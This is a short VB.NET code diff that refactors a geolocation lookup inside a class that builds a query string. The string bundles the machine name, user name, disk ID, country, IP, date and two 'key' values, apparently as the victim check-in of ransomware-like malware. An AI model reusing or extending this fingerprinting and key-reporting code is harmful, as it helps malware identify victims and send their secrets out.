@@ -58,7 +58,12 @@ Public Class clsS
     Public Shared sExe As String = Application.ExecutablePath.ToString
     Public Shared sMachineName As String = System.Environment.MachineName.ToString()
     Public Shared sUserName As String = Environment.UserName
-    Public Shared sLocation As String = clsGeoIP.GetHostInfo(clsGeoIP.GetExternalIp).Country & "|" & clsGeoIP.GetHostInfo(clsGeoIP.GetExternalIp).IP
+    Private Shared Function BuildLocation() As String
+        Dim externalIp As String = clsGeoIP.GetExternalIp()
+        Dim info As HostGeoInfo = clsGeoIP.GetHostInfo(externalIp)
+        Return info.CountryCode & "|" & info.IP
+    End Function
+    Public Shared sLocation As String = BuildLocation()
     Public Shared sQuery As String = "usuario=" & sMachineName & "|" & sUserName & "|" & hdd & "|" & sLocation & "|" &
                                DateTime.Now.ToString("dd/MM/yy") & "&llave1=" & sPrimaryKey & " " & "&llave2=" & sSecondaryKey & " "
 
